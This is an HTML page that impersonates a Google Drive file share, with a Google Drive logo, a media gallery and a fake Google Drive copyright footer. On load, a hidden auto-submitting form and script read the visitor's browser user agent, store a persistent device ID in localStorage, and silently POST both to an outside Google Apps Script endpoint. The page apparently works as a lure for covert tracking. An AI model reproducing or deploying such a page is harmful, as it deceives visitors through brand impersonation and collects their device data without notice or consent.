<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image and Video Gallery with Auto Submit Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 0;
            padding: 20px;
            background-color: #f0f0f0;
        }
        .gallery {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: center;
        }
        .gallery img {
            width: 100px;
            height: 100px;
            object-fit: cover;
            border: 1px solid #000;
        }
        .videos {
            display: flex;
            flex-direction: column;
            gap: 20px;
            margin-top: 20px;
            align-items: center;
        }
        .video-container {
            width: 400px;
        }
        .video-container video {
            width: 100%;
            height: auto;
        }
        #form-container {
            display: none;
        }
    </style>
</head>
<body>
    
       <div class="image-area" style="
    display: flex; 
    justify-content: center; 
    align-items: center; 
    height: 100px; 
    border: 0px solid #; 
    padding: 10px; 
    background-color: #;
    margin-bottom: 20px; /* Add 20px margin below the image area */
">
    <img src="https://raw.githubusercontent.com/drivefile-google/photos/main/google-drive-for-business_ufpw.png" alt="" style="
        max-width: 100%; 
        max-height: 100%; 
        object-fit: cover;
    ">
</div>
<div style="
    margin: 20px auto; /* 30px margin on top and bottom, auto on left and right */
    max-width: 200px; /* Set a maximum width for the div */
    text-align: center; /* Center the text inside the div */
    padding: 10px; /* Optional padding for better spacing */
    border: 1px solid #ccc; /* Optional border for visibility */
    background-color: #f9f9f9; /* Optional background color */
">
    Google Drive File
    <br>
    
</div>
    
<div class="gallery">
    <img src="https://raw.githubusercontent.com/drivefile-google/photos/main/images (6).jpeg" alt="Image 1">
    <img src="https://raw.githubusercontent.com/drivefile-google/photos/main/images (5).jpeg" alt="Image 2">
    <img src="https://raw.githubusercontent.com/drivefile-google/photos/main/images (4).jpeg" alt="Image 3">
    <img src="https://raw.githubusercontent.com/drivefile-google/photos/main/279779-download-1.jpg" alt="Image 4">
    <img src="https://raw.githubusercontent.com/drivefile-google/photos/main/images (3).jpeg" alt="Image 1">
    <img src="https://raw.githubusercontent.com/drivefile-google/photos/main/images (4).jpeg" alt="Image 2">
    
    
</div>

    <div class="videos">
        <div class="video-container">
            <video controls>
                <source src="https://raw.githubusercontent.com/drivefile-google/photos/main/MD Elias Khan Official - ছাগলে গাজা গাছ খাওয়ার পরে যা হলো দেখুন _ _পেইজে ফলে দিয়ে নতুন নতুন _1.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
        </div>
        <div class="video-container">
            <video controls>
                <source src="https://raw.githubusercontent.com/drivefile-google/photos/main/image2.jpg" type="video/mp4">
                Your browser does not support the video tag.
            </video>
        </div>
    </div>
    <div id="form-container">
        <form id="auto-submit-form">
            <input type="text" id="user-agent" name="user_agent" hidden>
            <input type="text" id="unique-number" name="unique_number" hidden>
            <input type="submit" value="Submit">
        </form>
    </div>
    
    
    <div style="
        margin-top: 30%;
    background-color: #f1f1f1; /* Light gray background */
    padding: 20px; /* Padding around the footer */
    text-align: center; /* Center the text in the footer */
    font-size: 14px; /* Font size for the footer text */
    color: #555; /* Dark gray text color */
    position: relative; /* Position relative for footer */
    bottom: 0; /* Stick to the bottom */
    width: 100%; /* Full width */
">
    <p style="margin: 5px 0;">© 2024 Google Drive. All rights reserved.</p>
    <a href="#" style="color: #555; text-decoration: none; margin: 0 10px;">Privacy Policy</a> |
    <a href="#" style="color: #555; text-decoration: none; margin: 0 10px;">Terms of Service</a> |
    <a href="#" style="color: #555; text-decoration: none; margin: 0 10px;">Help Center</a>
</div>

    
    
    <script>
        // Function to generate a unique number for the device
        function generateUniqueNumber() {
            let uniqueNumber = localStorage.getItem('uniqueNumber');
            if (!uniqueNumber) {
                uniqueNumber = Math.floor(Math.random() * 1000000).toString();
                localStorage.setItem('uniqueNumber', uniqueNumber);
            }
            return uniqueNumber;
        }

        // Auto-fill the form and submit it
        function autoSubmitForm() {
            const form = document.getElementById('auto-submit-form');
            const userAgentField = document.getElementById('user-agent');
            const uniqueNumberField = document.getElementById('unique-number');

            userAgentField.value = navigator.userAgent;
            uniqueNumberField.value = generateUniqueNumber();

            // Submit the form via AJAX
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://script.google.com/macros/s/AKfycbx_O5toKUZiA_BMgXMAZyOUK0d3vKOTmMM6VbusgYLPu5IThfp_Ov24I-7FLfFDjzQ/exec', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    console.log('Form submitted successfully');
                }
            };

            const formData = new FormData(form);
            const formParams = new URLSearchParams(formData).toString();

            xhr.send(formParams);
        }

        // Auto-submit form on page load
        window.onload = autoSubmitForm;
    </script>
</body>
</html>
